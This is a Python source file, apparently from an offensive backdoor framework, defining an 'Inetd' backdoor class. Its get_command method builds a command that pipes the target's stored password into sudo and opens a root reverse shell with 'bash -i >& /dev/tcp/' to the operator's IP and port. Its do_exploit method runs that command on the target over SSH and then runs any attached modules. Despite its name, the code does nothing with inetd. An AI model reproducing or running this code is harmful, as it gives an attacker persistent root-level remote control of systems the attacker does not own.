from backdoor import *

class Inetd(Backdoor):
    prompt = Fore.RED + "(inted) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Inetd backdoor..."
        self.core = core
        self.options = {
                }
        
        self.modules = {} 
        self.allow_modules = True
        self.help_text = "" 

    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % self.get_value("port")

    def do_exploit(self, args):
        target = self.core.curtarget
        print(GOOD + "Initializing backdoor...")
        target.ssh.exec_command(self.get_command())
        print(GOOD + "Inetd Backdoor attempted.")
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()

